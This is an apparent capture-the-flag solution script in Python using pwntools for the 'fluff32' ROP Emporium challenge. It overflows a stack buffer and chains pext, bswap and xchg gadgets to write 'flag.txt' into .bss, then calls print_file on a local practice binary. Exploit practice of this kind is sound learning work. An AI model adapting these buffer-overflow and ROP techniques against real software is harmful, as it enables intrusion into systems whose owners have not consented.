import textwrap
from pwn import *
from pwnlib.gdb import binary
from bitarray import bitarray


BINARY = './fluff32'
context.os = 'linux'
context.arch = 'i386'
context.binary = BINARY

#address
bss_address = 0x0804a020 #bss_address = 0x0804a020
print_file = 0x080483d0

#gadget
'''
 8048543:       89 e8                   mov    eax,ebp
 8048545:       bb ba ba ba b0          mov    ebx,0xb0bababa
 804854a:       c4 e2 62 f5 d0          pext   edx,ebx,eax
 804854f:       b8 ef be ad de          mov    eax,0xdeadbeef
 8048554:       c3                      ret
'''
pext = 0x08048543 # pext
pop_ebp = 0x080485bb #: pop ebp ; ret
pop_ecx_bswap_ecx = 0x08048558 # pop ecx ; bswap ecx ; ret
xchg_ecx_dl = 0x08048555 #: xchg byte ptr [ecx], dl ; ret         
pop_ecx_ebp = 0x08048524 #: pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret

# dl - 8bit

def bytes2bin(data,offset=32):
    return bin(unpack(data,offset,endian='little'))[2:]
def for_p32(data,offset=8):
    return hex(int(data,2))
def output_data(data):
    open('input', 'wb').write(data)

def create_mask(desired_value,src,desired_offset=8):
    r""" 
    Create a mask for pext instruction.
    :param desired_value: The desired value of the mask.
    :param src: The source value of the mask.
    :return: The mask.  
    
    Reffrence:https://www.felixcloutier.com/x86/pext
    """
    desired_value.zfill(desired_offset)


    src = src[::-1]
    desired_value = desired_value[::-1]
    ret = ''
    desired_value_index = 0
    for i in range(len(src)):
        if desired_value[desired_value_index] == src[i]:
            ret = '1' + ret
            desired_value_index+=1
        else:
            ret = '0' + ret
        
        if(desired_value_index == len(desired_value)):
                return ret
    return ret

def fill_ecx(val):
    r"""
    Fill ecx with desired value.
    :param val: The desired value.
    :return: The payload.
    """
    chain = b""
    chain += p32(pop_ecx_bswap_ecx)
    chain += pack(val, 32, endianness="big")
    return chain
def write_to_adr(val,adr,offset=32):
    r"""
    Write to address.
    :param val: The value to write.
    :param adr: The address to write.
    :param offset: The offset of the address.
    :return: The value written rop.
    """
    val_bin = bytes2bin(val,offset).zfill(offset)
    src = bin(0xb0bababa)[2:]
    val_bytes = textwrap.wrap(val_bin,8)
    masks = []
    for val_byte in val_bytes:
        log.info(f"val_byte:{val_byte} -> {pack(int('0b'+val_byte,2),8)}")
        created_mask = create_mask(val_byte,src)
        padded_mask = created_mask.zfill(32)
        log.info(f'padded_mask:{padded_mask}')
        masks.append(padded_mask)
    
    log.info(f"masks:{masks}")
    log.info("###############################################")
    log.info("# WRITE TO ADDRESS #")
    log.info("###############################################")

    chain = b""
    index = 0
    for mask in masks[::-1]:
        chain += p32(pop_ebp)
        mask_int_val = int(mask,2)
        mask_byte_str = pack(mask_int_val,32)
        log.info(f"mask_int_val:{mask_int_val}")
        print(f"mask_byte_str:{mask_byte_str}")
        chain += mask_byte_str
        chain += p32(pext)
        chain += fill_ecx(adr+index)
        chain += p32(xchg_ecx_dl)
        index += 1
    return chain
def exploit():
    rop = b'A'*44
    rop+=write_to_adr(b'flag.txt',bss_address,64)
    rop+=p32(print_file)
    rop+=b'BBBB'
    rop+=p32(bss_address)
    return rop



# print(bin(0xb0bababa)[2:])
log.info(f'src: {bin(0xb0bababa)[2:]}')
log.info(f"created_mask:{create_mask(bytes2bin(b'l',8),bin(0xb0bababa)[2:],8)}")
log.info(f'b"l":{bytes2bin(b"l",8)}')
write_to_adr(b'flag.txt',bss_address,64)
# print(bytes2bin(b'flag.txt',64))
#10110000101110101011101010111010  pleeeeeeeeease
#00000000000000000000001011011101  created_mask
#00000000000000000000000001101100
# write_to_adr(b'flag.txt',bss_address)
rop = exploit()
p = process(BINARY)
p.sendline(rop)
flag = p.recvall()
print(flag)
output_data(rop)










